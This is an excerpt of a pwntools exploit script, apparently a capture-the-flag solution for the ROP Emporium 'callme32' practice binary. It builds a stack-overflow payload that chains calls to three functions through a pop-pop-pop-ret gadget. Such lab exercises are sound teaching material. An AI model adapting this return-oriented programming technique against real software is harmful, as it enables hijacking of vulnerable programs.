...
def exploit(p, bin_fname, libc_fname):
	...
	pppr = 0x080488a9 # From ROPgadget --binary callme32. Does three pops and a ret

	buf = cyclic_find('laaa') * 'a'
	buf += p32(e.symbols['callme_one'])
	buf += p32(pppr)                      # Return to pop off arguments
	buf += p32(1) + p32(2) + p32(3)       # one's arguments
	buf += p32(e.symbols['callme_two'])   # pppr's return address
	buf += p32(pppr)                      # Return to pop off arguments
	buf += p32(1) + p32(2) + p32(3)       # two's arguments
	buf += p32(e.symbols['callme_three']) # pppr's return address
	buf += 'a' * 4                        # Trash return address
	buf += p32(1) + p32(2) + p32(3)       # three's arguments
